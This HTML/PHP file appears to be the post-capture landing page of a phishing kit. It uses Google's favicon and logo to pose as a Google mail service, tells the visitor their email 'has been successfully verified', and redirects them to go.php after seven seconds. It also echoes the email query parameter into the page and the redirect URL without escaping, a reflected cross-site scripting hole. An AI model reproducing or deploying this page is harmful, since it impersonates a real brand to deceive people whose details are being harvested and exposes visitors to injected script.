<!doctype html>
<html>
<meta HTTP-EQUIV="REFRESH" content="7; url=go.php?email=<?php echo $_GET['email']; ?>">
<style type="text/css">
<!--
#Layer1 {
	position:absolute;
	left:374px;
	top:23px;
	width:437px;
	height:367px;
	z-index:1;
	margin-top: 5%;
	margin-right: 5%;
	right: 20%;
	bottom: 200%;
	margin-bottom: 5%;
	margin-left: 5%;
	border: thin solid #0066CC;
	border-radius:7px;
	padding: 5px;
}
#Layer2 {	position:absolute;
	left:0px;
	top:3px;
	width:440px;
	height:66px;
	z-index:2;
	border-bottom-width: thin;
	border-top-style: groove;
	border-right-style: groove;
	border-bottom-style: groove;
	border-left-style: groove;
	border-bottom-color: #0066CC;
	border-top-width: 00px;
	border-right-width: 00px;
	border-left-width: 00px;
}
.error  {font-family: "Courier New", Courier, monospace;color: red; font-size:16px; font-weight:bold;}
#Layer3 {
	position:absolute;
	left:0px;
	top:81px;
	width:439px;
	height:255px;
	z-index:3;
	vertical-align: bottom;
}
#Layer4 {
	position:absolute;
	left:1011px;
	top:110px;
	width:71px;
	height:34px;
	z-index:2;
}
-->
</style>
<link rel="shortcut icon" href="https://www.google.com//favicon.ico" />
<title>verification Successful</title>
<style type="text/css">
<!--
.style6 {

	color: #0000FF;
	background-color: #2BAAFF;
	vertical-align: top;
}
.style7 {
	font-family: "Courier New", Courier, monospace;
	font-size: larger;
}
.style4 {font-family: "Courier New", Courier, monospace;
	color:#0066CC;
	font-size:20px
}
.style5 {font-family: "Courier New", Courier, monospace}
-->
</style>
<body>
<div align="center" id="Layer1">
  <div class="style4">
  <div class="style6">
    <div align="left"><img src="files/success.jpg" width="103" height="65" align="top"/></div>
  </div>
    <table width="100%" height="253" border="0" align="center" cellspacing="10">
      <tr>
        <td height="60" align="left" valign="middle"><p>Hi <?php echo $_GET['email']; ?>,</p>
          <p>Verification completed and <?php echo $_GET['email']; ?> has been successfully verified.</p>
          <p>Thanks for using our mail service.</p></td>
      </tr>
	  <tr>
        <td height="66" align="left" valign="middle"><span class="style5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;powered by:</span> <img src="files/google_logo_41.png" alt="q" height="32" /></td>
      </tr>
    </table>
  </div>
</div>
</div>
</body>
</html>